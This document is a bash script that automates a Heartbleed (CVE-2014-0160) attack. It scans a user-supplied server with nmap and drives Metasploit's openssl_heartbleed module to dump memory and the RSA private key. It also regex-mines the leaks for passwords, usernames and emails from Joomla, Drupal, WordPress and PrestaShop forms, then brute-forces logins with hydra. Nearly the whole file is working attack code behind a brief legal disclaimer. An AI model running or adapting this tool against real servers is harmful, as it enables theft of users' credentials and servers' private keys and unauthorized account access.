#!/bin/bash

# 
# AUTHOR: Dionka
# DATE:   22 Feb 2015
#
# Use at your own risk
#
#
#   This tool may be used for legal purposes only. Users take full responsibility
#   for any actions performed using this tool. If these terms are not acceptable 
#   to you, then do not use this tool.
#
#    What it does
#   ===============
#   It uses nmap and checks if a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
#       If the user desires it, it starts attacking the server searching for  leak data and the server's RSA private key
#   It stores the results as a text file and tries to find usernames, passwords, emails using the leaked data.
#   It is tested on: joomla, drupal, wordpress and prestashop login and register form. It may works on other platforms as well.
#   If the user desires it, it can use the credentials and try to brute force the site given, using the HYDRA.
#   In order to run, the system needs the tools: Nmap vrs 6.46 or greater, postrgresql, metasploit and hydra.
#   Runs smoothly on Kali Linux.
#   
 
echo " "
echo -e "\e[101m                                               \e[0m"
echo -e "\e[101m        ( ) _               ( )                \e[0m"   
echo -e "\e[101m       _| |(_)   _     ___  | |/')    _ _      \e[0m"
echo -e "\e[101m     / _  || | / _ \ /  _  \| , <   / _  )     \e[0m"
echo -e "\e[101m    ( (_| || |( (_) )| ( ) || |\ \ ( (_| |     \e[0m"
echo -e "\e[101m     \__,_)(_) \___/ (_) (_)(_) (_) \__,_)     \e[0m"
echo -e "\e[101m                                               \e[0m"
echo ""
 
echo -e "\e[101m >>> \e[0m  Write the Servers Ip you want to attack:"
read host
#Prota elegxo me tin nmap, meta epithesi
 
echo -e "\e[101m >>> \e[0m Starting nmap...Checking for vulnerability"
nmap -p 443 --script ssl-heartbleed.nse $host > nmapresults.txt
 
if grep -q "1 host up"  nmapresults.txt; then  
    if grep -q "VULNERABLE" nmapresults.txt ; then
        echo -e "\e[101m >>> \e[0m Server seems Vulnerable. Do you want to proceed with heartbleed attack?"
        read apofasi
    else   
        echo -e "\e[101m >>> \e[0m Host seems not Vulnerable. Do you want to proceed anyway?"
        read apofasi
    fi
elif grep -q "Host seems down" nmapresults.txt ; then
    echo -e "\e[101m >>> \e[0m Host seems down. Do you want to proceed anyway?"
    read apofasi    
else
    echo -e "\e[101m >>> \e[0m Something went wrong.No attack will occure."
    read apofasi
fi
## Telos elegxos nmap
 
 
if [ $apofasi == yes ] || [ $apofasi == y ] ; then
 
    echo -e "\e[101m >>> \e[0m  How many times do you want to run the attack?"
    read time1
 
    date1=`date +%d%m%Y-%H:%M`
    path=$host'&'$date1
    mkdir $path
    output=$path"/output.txt"
     
    service postgresql start
    service metasploit start
 
    #Dimiourgia tou arxeiou pou tha parei san parametro to msfconsole
    rcfile=$path/heartbleed.rc
    echo spool ./$output > $rcfile
    echo use auxiliary/scanner/ssl/openssl_heartbleed >> $rcfile
    echo set RHOSTS $host >> $rcfile 
    echo set verbose true >> $rcfile
    for ((i = 1; i <= $time1; i++)); 
    do
        echo run >> $rcfile
    done
    echo set ACTION KEYS >> $rcfile
    echo run >> $rcfile
    echo exit >> $rcfile
 
 
    echo -e "\e[101m >>> \e[0m  The input file for msfconsole is now created. Please wait.."
 
    msfconsole -r $rcfile
 
    service metasploit stop 
    service postgresql stop
 
    sleep 2
    echo " "
    echo -e "\e[101m >>> \e[0m  The attack is now completed. It run $time1 times."
 
    ## apo do kai kato epexergasia arxeion.
    allleaked=$path"/alleaked.txt"
 
 
    if grep -q "Printable info leaked" $output; then
        grep "Printable info leaked" $output  > $allleaked
        ##if [[ -s $allleaked ]] ; then
        echo ""
        echo -e "\e[101m Information leaked \e[0m"
        echo -e "\e[101m >>> \e[0m  Do you want to see the info leaked?"
        read decision
        if [ $decision == yes ] || [ $decision == y ]; then
            cat $allleaked
        fi
 
 
        echo -e "\e[101m >>> \e[0m  It will now start finding usernames,passwords and emails."
        results=$path"/results"
        mkdir $results
        ## That could be in loop searching for anything user wants.
        ## DIAGRAFI DIPLOEGGRAFES me to sort uniq 
         
     
        cat $allleaked | grep -oP 'password=\K(?:(?!&).)*' | sort | uniq  > $results/password.txt
        cat $allleaked | grep -oP 'pass=\K(?:(?!&).)*' | sort | uniq  >> $results/password.txt     ##drupal 
        cat $allleaked | grep -oP 'passwd=\K(?:(?!&).)*' | sort | uniq  >> $results/password.txt   ##joomla/prestashop login module
        cat $allleaked | grep -oP 'psw=\K(?:(?!&).)*' | sort | uniq  >> $results/password.txt 
        cat $allleaked | grep -oP 'pwd=\K(?:(?!&).)*' | sort | uniq  >> $results/password.txt      ##wordpress login
 
        #cat $allleaked | grep -oP '\'name=\K(?:(?!&).)*' | sort | uniq  > $results/username.txt   ##drupal login-> name=opoiosdipote xaraktiras ektos apo "    
        cat $allleaked | grep -oP 'username=\K(?:(?!&).)*' | sort | uniq  >> $results/username.txt
        cat $allleaked | grep -oP 'log=\K(?:(?!&).)*' | sort | uniq  >> $results/username.txt      ##wordpress login
        cat $allleaked | grep -oP 'signup_username=\K(?:(?!&).)*' | sort | uniq  >> $results/username.txt  ##wordpress 
 
        cat $allleaked | grep -oP 'email=\K(?:(?!&).)*'  | sort | uniq > $results/emails.txt
        cat $allleaked | grep -oP 'email=\K(?:(?!-).)*'  | sort | uniq >> $results/emails.txt
        cat $allleaked | grep -oP 'email_create=\K(?:(?!&).)*'  | sort | uniq >> $results/emails.txt
        cat $allleaked | grep -oP 'email_create=\K(?:(?!-).)*'  | sort | uniq >> $results/emails.txt
        cat $allleaked | grep -oP 'signup_email=\K(?:(?!&).)*'  | sort | uniq >> $results/emails.txt  ##wordpress register
        cat $allleaked | grep -oP 'signup_email=\K(?:(?!-).)*'  | sort | uniq >> $results/emails.txt  ##wordpress register
         
        ## JOOJMLA REGISTRATION FORM##
        cat $allleaked | grep -oP 'jform\[username\]\"\K(?:(?!-).)*' | sort | uniq  >> $results/username.txt
        cat $allleaked | grep -oP 'jform\[name\]\"\K(?:(?!-).)*' | sort | uniq  >> $results/username.txt
        cat $allleaked | grep -oP 'jform\[password1\]\"\K(?:(?!--).)*' | sort | uniq  >> $results/password.txt  ##password 1 or 2
        cat $allleaked | grep -oP 'jform\[email1\]\"\K(?:(?!---).)*' | sort | uniq  >> $results/emails.txt 
        cat $allleaked | grep -oP 'email%5D=\K(?:(?!&).)*' | sort | uniq  >> $results/emails.txt 
     
 
        ## drupal REGISTRATION FORM##
        cat $allleaked | grep -oP '\"name\"\K(?:(?!-).)*' | sort | uniq  >> $results/username.txt
        cat $allleaked | grep -oP '\"mail\"\K(?:(?!-).)*' | sort | uniq  >> $results/emails.txt   
        cat $allleaked | grep -oP '\"pass\[pass1\]\"\K(?:(?!--).)*' | sort | uniq  >> $results/password.txt
         
        cat $output | grep -oP 'Certificate #1: #\K(?:(?!\n).)*' | sort | uniq > $results/certificate.txt
        #cat $allleaked | grep -oP 'GET \K(?:(?!Connention:).)*'  | sort | uniq > $results/cookies.txt
 
        echo -e "\e[101m >>>\e[0m Files with usernames etc. are created.."
        echo -e "\e[101m >>>\e[0m Would you like to brute force with the credentials you found, if any?"
        read decision
        if [ $decision == yes ] || [ $decision == y ]; then
            if [[ -s $results/username.txt ]] ; then           
            echo -e "\e[101m >>>\e[0m Please write the site (for example http://www.site.com/login)
Please note that the protocol is mandatory."
            read site
            hydra -L $results/username.txt -P $results/password.txt -o $results/validcredentials.txt $site 
            echo -e "\e[101m >>>\e[0m Brute forse is done. Please check the files for results."
            else
            echo -e "\e[101m >>>\e[0m Sorry...no username found..."
            fi
         
        fi
     
    ###########na bro ta cookie
    ##  GET /a/login_page.php HTTP/1.1 Host: 192.168.2.3 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.2.3/a/a.html Cookie: PHPSESSID=mbg26nmnesgnu8kfsnj6dlpn23 Connection: keep-alive Content-Length: 44
 
 
        ## edo ti ginete me to private key an to brike i oxi kai ti to kanei.
        if  grep -q "BEGIN RSA PRIVATE KEY." $output; then
            echo ""
            echo -e "\e[101m Private key found! \e[0m"
            ##den exei dokimastei i antigrafi
            grep -oP 'Private key stored in \K(?:(?!\n).)*' $output > keypath.txt
            keypath=`cat keypath.txt`
            echo $keypath
            cp $keypath $results"/privatekey.txt"
            rm $keypath
            rm keypath.txt
            #grep "Private key stored" $output
            echo -e "\e[101m >>> \e[0m  Key is stored in file: "$results"/privatekey.txt" 
        elif grep -q "Private key not found." $output; then
            echo ""
            echo -e "\e[101m >>> \e[0m No Private key found!"
            else
            echo -e "\e[101m >>> \e[0m No info about the key"
        fi
 
 
 
    elif grep -q "Looks like there isn't leaked information." $output; then
        echo ""
        echo -e "\e[101m >>> \e[0m Scan completed" 
        echo -e "\e[101m >>> \e[0m No information leaked"
        if grep -q "No Heartbeat response" $output; then
            echo -e "\e[101m >>> \e[0m Probably the server is not vulnerable.Cheack and try again."
        fi
    else
        echo -e "\e[101m >>> \e[0m Nothing Happened..Probably the server is down. Cheack and try again."
    fi
 
else
    echo -e "\e[101m >>> \e[0m No heartbleed attack took place.."
fi
    rm nmapresults.txt
    echo -e "\e[101m                  THE END                     \e[0m"
exit
